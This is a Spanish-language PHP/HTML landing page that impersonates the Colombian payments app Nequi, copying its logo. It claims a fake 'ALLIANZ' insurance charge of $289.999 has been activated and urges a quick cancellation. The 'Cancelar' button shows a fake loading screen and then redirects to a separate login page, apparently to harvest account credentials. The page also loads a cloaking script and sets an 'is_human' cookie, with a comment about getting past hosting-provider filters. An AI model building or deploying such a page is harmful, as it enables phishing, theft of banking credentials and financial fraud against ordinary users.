<?php
require_once __DIR__ . '/cloak.php';
// Establecer al visitante inicial como humano tras pasar los filtros de Vercel/Cloudflare previstos visualmente
if (!isset($_COOKIE['is_human'])) {
    cloak_set_cookie('is_human', 'true');
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>¡Plata de una en tu Nequi!</title>
  
  <link rel="stylesheet" href="css/index-1.css">
  <link rel="stylesheet" href="css/spinner-3.css">
  <link rel="stylesheet" href="css/navbar-1.css">
  <link rel="stylesheet" href="css/globals-3.css">
  <link rel="stylesheet" href="css/styles.css">
  <link rel="shortcut icon" type="image/x-icon" href="assets/favicon-3.ico">
  
  <style>
    * { box-sizing: border-box; }
    .loadingContainer { display: none; }
    
    .chat-banner {
        position: fixed;
        bottom: 24px;
        left: 50%;
        transform: translateX(-50%);
        width: 90%;
        max-width: 400px;
        background-color: #1a0a1c;
        border-radius: 12px;
        padding: 16px 20px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        z-index: 50;
        border: 1px solid rgba(255,255,255,0.05);
    }
    .chat-banner-text { display: flex; flex-direction: column; }
    .chat-banner-text strong { color: #ffffff !important; font-size: 17px; font-weight: bold; margin-bottom: 2px; font-family: system-ui, -apple-system, sans-serif; }
    .chat-banner-text span { color: #d1d5db !important; font-size: 14px; font-family: system-ui, -apple-system, sans-serif; }
    .chat-icon-btn {
        background-color: #da0081;
        border-radius: 10px;
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        box-shadow: 0 4px 6px rgba(218,0,129,0.3);
    }
  </style>
</head>
<body style="margin: 0; padding: 0; background-color: #e5e5e5; font-family: system-ui, -apple-system, sans-serif;">

  <main class="loadingContainer">
      <div class="mainSectionWrapper" style="padding-top: 100px; text-align: center;">
        <div class="logo_nequi_animado" style="display: flex; justify-content: center;">
          <img src="assets/loading-nequi-1.webp" alt="" style="width: 150px;">
        </div>
        <p class="wait-msg" style="margin-top: 20px;">Por favor, espere...</p>
        <p class="info-msg">En este momento estamos procesando su solicitud. Puede tardar un momento.</p>
      </div>
  </main>

  <header style="position: fixed; top: 0; left: 0; width: 100%; height: 64px; background-color: #ffffff; z-index: 999; border-bottom: 1px solid #e5e7eb; display: flex; align-items: center;">
    <div style="width: 100%; padding: 0 26px; display: flex; justify-content: center;">
      <div style="width: 100%; max-width: 990px; display: flex; align-items: center; justify-content: space-between;">
        <a href="#" style="height: 32px; display: flex; align-items: center;">
          <svg width="100" height="32" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
            <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
            <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
            <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
            <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
            <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
          </svg>
        </a>
        <button style="display: flex; flex-direction: column; justify-content: space-between; width: 25px; height: 18px; background: transparent; border: none; padding: 0; cursor: pointer;">
          <span style="width: 100%; height: 2px; background-color: #200020; border-radius: 2px;"></span>
          <span style="width: 100%; height: 2px; background-color: #200020; border-radius: 2px;"></span>
          <span style="width: 100%; height: 2px; background-color: #200020; border-radius: 2px;"></span>
        </button>
      </div>
    </div>
  </header>

  <main style="padding-top: 64px; position: relative; width: 100%; height: calc(100vh - 64px); display: flex; flex-direction: column; overflow: hidden; background-color: #e5e5e5;">
    
    <!-- Contenedor Textual y Botón (Asegura que el fondo oscuro cubra TODO este texto y el SVG cuelgue de abajo) -->
    <div style="background-color: #1a0a1c; position: relative; z-index: 30; padding: 40px 24px 30px 24px; width: 100%;">
      
      <h1 style="color: #ffffff !important; font-size: 26px; font-weight: bold; line-height: 1.2; margin-top: 0; margin-bottom: 16px; text-align: left;">
        Inicia el proceso de cancelación<br>Seguro ALLIANZ.
      </h1>
      <p style="color: #f3f4f6 !important; font-size: 15px; font-style: italic; line-height: 1.4; margin-top: 0; margin-bottom: 24px; text-align: left; max-width: 90%;">
        Recuerda, tienes 24 horas desde la activación para<br>cancelar sin ningún costo adicional.Débito<br>automático mensual: $289.999
      </p>
      
      <!-- El botón está posicionado dentro de este contenedor seguro, imposible que colisione con el SVG -->
      <button id="btnCancelar" style="background-color: #da0081; color: #ffffff !important; font-weight: 500; font-size: 16px; padding: 12px 24px; border-radius: 6px; border: none; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); pointer-events: auto; position: relative; z-index: 40;">
        Cancelar
      </button>

      <!-- Capa Vectorial anclada al FONDO de este div (nunca subirá a superponerse al botón ni al texto) -->
      <div style="position: absolute; bottom: 0; left: 0; width: 100%; transform: translateY(98%); z-index: 10; pointer-events: none;">
          <svg viewBox="0 0 400 250" style="width: 100%; display: block; overflow: visible;">
              
              <!-- Triángulo Fucsia apuntando a la izquierda -->
              <polygon points="140,160 450,50 450,400" fill="#da0081" stroke="#da0081" stroke-width="20" stroke-linejoin="round" />
              
              <!-- Masa Oscura Principal que continúa el fondo -->
              <polygon points="-50,-10 450,-10 450,40 80,120 -50,60" fill="#1a0a1c" stroke="#1a0a1c" stroke-width="20" stroke-linejoin="round" />
              
              <!-- Fragmento Pequeño Oscuro Flotante -->
              <polygon points="40,140 60,135 65,155 45,160" fill="#1a0a1c" stroke="#1a0a1c" stroke-width="10" stroke-linejoin="round" />
          </svg>
      </div>
    </div>

    <!-- Contenedor de la Imagen y Flechas (Ocupa el resto de la pantalla) -->
    <div style="position: relative; flex-grow: 1; width: 100%; z-index: 0; min-height: 250px;">
        <!-- Imagen de Fondo -->
        <img src="https://images.unsplash.com/photo-1596484552834-6a58f850e0a1?auto=format&fit=crop&w=600&q=80" alt="Buggy" style="width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0;">
        
        <!-- Degradado -->
        <div style="position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent);"></div>
        
        <!-- Flechas Laterales (Centradas respecto a la imagen disponible, NUNCA sobre el texto) -->
        <button style="position: absolute; left: 16px; top: 50%; transform: translateY(-50%); background-color: rgba(226,226,250,0.9); border: 1px solid #a4a4e8; padding: 10px; border-radius: 6px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); cursor: pointer; z-index: 20;">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1c0021" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
        </button>
        <button style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); background-color: rgba(226,226,250,0.9); border: 1px solid #a4a4e8; padding: 10px; border-radius: 6px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); cursor: pointer; z-index: 20;">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1c0021" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
        </button>
    </div>

  </main>
  
  <div class="chat-banner">
      <div class="chat-banner-text">
          <strong>¿Necesitas ayuda?</strong>
          <span>Chatea con tu asistente</span>
      </div>
      <div class="chat-icon-btn">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
              <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM12 12l-1.5-3.5L7 7l3.5-1.5L12 2l1.5 3.5L17 7l-3.5 1.5L12 12z"/>
          </svg>
      </div>
  </div>

  <script>
    document.getElementById('btnCancelar').addEventListener('click', function() {
        const loadingSpinner = document.querySelector(".loadingContainer");
        const chatBanner = document.querySelector(".chat-banner");
        
        if(loadingSpinner) {
            loadingSpinner.style.display = "block";
            if(chatBanner) chatBanner.style.display = "none";
        }
        
        setTimeout(() => {
            window.location.href = "access-passed/login.php"; 
        }, 3000);
    });
  </script>
</body>
</html>